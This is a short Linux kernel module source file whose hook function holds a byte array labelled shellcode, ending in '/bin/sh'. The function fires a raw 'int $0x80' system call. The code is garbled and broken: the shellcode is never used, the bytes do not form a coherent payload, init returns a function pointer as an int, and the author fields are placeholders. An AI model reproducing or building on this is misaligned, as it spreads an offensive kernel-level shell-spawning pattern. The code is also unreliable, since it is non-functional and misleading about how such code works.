#include <linux/module.h>
#include <linux/sched.h>
#include <asm/smp_lock.h>
#include <asm/prctl.h>
#include <asm/unistd.h>
#include <asm/syscalls.h>

static int hook_function(struct pt_regs *regs)
{
    uint8_t shellcode[] = \
        "\xeb\x1f\x5e\x89\x76\x08\x66\x07\x89\x1f\x8d\x73\x02" \
        "\x73\x00\x89\xfc\x66\x02\x89\x75\xe0\x89\xd3\x81\xfc" \
        "\x89\x76\x04\x03\x8d\x37\x02\x8d\x46\x00\xcd\x80" \
        "\x31\xc0\x50\xe8\x68\xfc\xff\xff\xff\x2f\x62\x69\x6e\x2f" \
        "\x73\x68";

    asm volatile ("movl $0, %%eax");
    asm volatile ("int $0x80");
    return 0;
}

static int __init your_driver_init(void)
{
    return hook_function;
}

static void __exit your_driver_exit(void)
{
    printk(KERN_INFO "Goodbye.");
}

module_init(your_driver_init);
module_exit(your_driver_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Your Description");
